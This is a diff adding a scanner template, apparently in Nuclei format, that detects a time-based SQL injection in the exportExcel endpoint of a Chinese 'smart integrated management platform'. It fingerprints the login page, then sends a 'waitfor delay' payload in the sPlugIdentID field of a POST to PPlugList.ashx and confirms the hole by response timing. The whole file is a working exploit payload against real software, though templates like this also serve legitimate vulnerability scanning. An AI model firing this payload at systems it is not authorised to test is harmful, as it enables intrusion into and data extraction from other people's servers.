@@ -1,0 +1,49 @@
+id: poc-yaml-windor-icmp-exportexcel-sqli
+info:
+  name: 银达汇智 智慧综合管理平台 exportExcel SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+
+variables:
+  t1: '{{rand_int(5, 10)}}'
+  t2: '{{to_number(t1) + 2}}'
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "智慧综合管理平台登入"
+        part: body
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/Module/CJGL/Controller/PPlugList.ashx"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      action=exportExcel&sPlugIdentID='waitfor+delay'0:0:{{t1}}'--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "application/vnd"
+        part: header
+      - type: word
+        words:
+          - ".xlsx"
+        part: header
+      - type: dsl
+        dsl:
+          - duration > to_number(t1)
+          - duration < to_number(t2)
